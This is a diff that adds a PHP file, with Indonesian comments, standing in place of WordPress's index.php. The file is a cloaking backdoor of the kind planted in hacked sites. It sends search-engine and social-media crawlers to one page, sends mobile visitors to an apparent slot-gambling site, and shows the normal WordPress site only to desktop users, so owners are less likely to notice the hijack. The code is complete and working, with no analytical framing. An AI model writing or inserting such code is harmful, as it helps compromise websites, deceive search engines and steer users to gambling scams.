@@ -1,0 +1,32 @@
+<?php
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+// Deteksi bot
+$bot_agents = [
+    'Googlebot', 'bingbot', 'AhrefsBot', 'Google-InspectionTool',
+    'TelegramBot', 'facebookexternalhit', 'Slackbot',
+    'Twitterbot', 'LinkedInBot'
+];
+
+// Deteksi mobile
+$mobile_agents = ['Android', 'iPhone', 'iPad', 'iPod', 'Opera Mini', 'IEMobile', 'Mobile'];
+
+// Redirect untuk BOT ke aquiva.html
+foreach ($bot_agents as $bot) {
+    if (stripos($user_agent, $bot) !== false) {
+        header("Location: https://aquiva.co.id/aquiva.html", true, 301);
+        exit;
+    }
+}
+
+// Redirect untuk pengguna MOBILE ke slot-ai-gacor.web.app
+foreach ($mobile_agents as $mobile) {
+    if (stripos($user_agent, $mobile) !== false) {
+        header("Location: https://slot-ai-gacor.web.app/", true, 301);
+        exit;
+    }
+}
+
+// Default: tampilkan WordPress normal (untuk pengguna desktop)
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
